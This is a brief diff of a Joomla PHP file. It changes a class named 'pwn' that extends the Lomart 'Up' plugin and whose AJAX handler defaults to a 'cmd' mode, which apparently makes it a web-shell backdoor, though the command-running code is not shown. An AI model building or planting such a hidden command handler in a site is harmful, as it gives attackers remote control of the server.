@@ -1,9 +1,6 @@
 <?php
 defined('_JEXEC') or die();
 
-use Joomla\CMS\Factory;
-use Lomart\Plugin\Content\Up\Helper\UpHelper;
-
 class pwn extends Lomart\Plugin\Content\Up\Extension\Up
 {
     public static function goAjax($input)
@@ -19,7 +16,6 @@ class pwn extends Lomart\Plugin\Content\Up\Extension\Up
         }
 
         $m = $output['m'] ?? 'cmd';
-        header('Content-Type: application/json');
 
         try {
             switch ($m) {
